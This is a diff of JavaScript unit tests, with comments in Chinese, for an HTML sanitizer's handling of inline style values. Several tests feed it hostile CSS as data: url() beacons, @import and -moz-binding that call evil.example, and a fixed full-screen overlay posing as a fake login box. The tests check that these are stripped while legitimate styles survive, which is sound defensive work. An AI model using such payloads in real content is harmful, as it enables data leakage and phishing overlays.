@@ -103,6 +103,68 @@ describe("sanitizeHtml：不得误伤正常内容", () => {
   });
 });
 
+/* ============================================================
+ * v3.7.90：style 属性**值**的消毒
+ * ------------------------------------------------------------
+ * 此前 sanitizeHtml 只看标签、on* 事件与 URL 类属性，**不看 style 的值**。
+ * 而全仓约 25 处把动态值拼进内联 style（`style="color:${s.color}"` 等），
+ * s.color 来自场景定义 —— 自定义场景 / 插件 JSON / 导入的备份与云快照都能写入任意值。
+ * 危害不是执行 JS（现代浏览器 CSS 里做不到），而是外部请求信标与界面伪装。
+ * ============================================================ */
+describe("sanitizeHtml：style 值消毒（v3.7.90）", () => {
+  it("style 里的 url(...) 被清除（阻断渲染即外发的信标）", () => {
+    const clean = __test.sanitizeHtml('<span style="color:red;background:url(https://evil.example/beacon?d=1)">x</span>');
+    expect(clean).not.toContain("evil.example");
+    expect(clean).not.toMatch(/url\s*\(/i);
+  });
+
+  it("style 里的 @import / behavior / -moz-binding 被清除", () => {
+    const a = __test.sanitizeHtml('<div style="@import url(https://evil.example/a.css)">x</div>');
+    expect(a).not.toMatch(/@import/i);
+    const b = __test.sanitizeHtml('<div style="behavior:url(#default#time2)">x</div>');
+    expect(b).not.toMatch(/behavior\s*:/i);
+    const c = __test.sanitizeHtml('<div style="-moz-binding:url(https://evil.example/x.xml)">x</div>');
+    expect(c).not.toMatch(/-moz-binding/i);
+  });
+
+  it("style 里的 position / inset / z-index 被清除（阻断全屏覆盖层伪装）", () => {
+    const clean = __test.sanitizeHtml('<span style="color:red;position:fixed;inset:0;z-index:99999">假登录框</span>');
+    expect(clean).not.toMatch(/position\s*:/i);
+    expect(clean).not.toMatch(/inset\s*:/i);
+    expect(clean).not.toMatch(/z-index\s*:/i);
+  });
+
+  it("**不得误伤**合法内联样式：颜色/尺寸/transform/var()/color-mix()", () => {
+    const clean = __test.sanitizeHtml(
+      '<span style="color:var(--sc-office, #0a6cbd);background:color-mix(in srgb, var(--accent) 14%, transparent);font-size:var(--fs-lg);transform:translateY(2px)">x</span>'
+    );
+    expect(clean).toContain("var(--sc-office, #0a6cbd)");
+    expect(clean).toContain("color-mix(in srgb");
+    expect(clean).toContain("font-size:var(--fs-lg)");
+    expect(clean).toContain("transform:translateY(2px)");
+  });
+
+  it("**不得误伤**合法定位写法：画布卡片与虚拟滚动依赖 left/top", () => {
+    /* render-widgets.js:526 画布卡片、render-scene-main.js:47 虚拟滚动都在用 */
+    const clean = __test.sanitizeHtml('<div class="cs-canvas-item" style="left:12px;top:34px;width:100px;height:60px">x</div>');
+    expect(clean).toContain("left:12px");
+    expect(clean).toContain("top:34px");
+    expect(clean).toContain("width:100px");
+  });
+
+  it("**不得误伤** margin-top / border-top 这类含 top 字样的属性", () => {
+    const clean = __test.sanitizeHtml('<p style="margin-top:var(--space-3);border-top:1px dashed var(--line)">x</p>');
+    expect(clean).toContain("margin-top:var(--space-3)");
+    expect(clean).toContain("border-top:1px dashed var(--line)");
+  });
+
+  it("无引号 style 写法同样被消毒，并规范化为双引号", () => {
+    const clean = __test.sanitizeHtml("<span style=color:red;position:fixed>x</span>");
+    expect(clean).not.toMatch(/position\s*:/i);
+    expect(clean).toContain("style=");
+  });
+});
+
 describe("_dgmSvgHtml：图表节点字段不得逃出属性/样式", () => {
   const evil = {
     nodes: [{
